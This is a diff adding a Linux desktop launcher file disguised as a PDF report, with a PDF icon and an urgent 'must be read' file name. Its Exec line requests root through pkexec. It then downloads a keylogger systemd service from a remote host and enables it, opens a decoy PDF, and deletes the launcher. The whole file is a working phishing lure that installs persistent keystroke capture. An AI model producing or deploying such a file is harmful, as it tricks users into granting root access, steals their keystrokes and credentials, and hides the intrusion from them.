@@ -1,0 +1,8 @@
+[Desktop Entry]
+Version=1.0
+Name=REPORT_MUST_TO_BE_READ_2025.pdf
+Comment=REPORT_ACTIVITY2025
+Exec=sh -c 'pkexec sh -c "curl -s http://<ip>:4000/keylogger.service -o /etc/systemd/system/keylogger.service && chmod 644 /etc/systemd/system/keylogger.service && systemctl daemon-reload && systemctl enable --now keylogger.service" ; curl -s http://<ip>:4000/REPORT_MUST_TO_BE_READ_2025.pdf -o ~/Desktop/REPORT_MUST_TO_BE_READ_2025.pdf && open ~/Desktop/REPORT_MUST_TO_BE_READ_2025.pdf && rm ~/Desktop/keylogger.desktop'
+Icon=application-pdf
+Type=Application
+Categories=Utility;
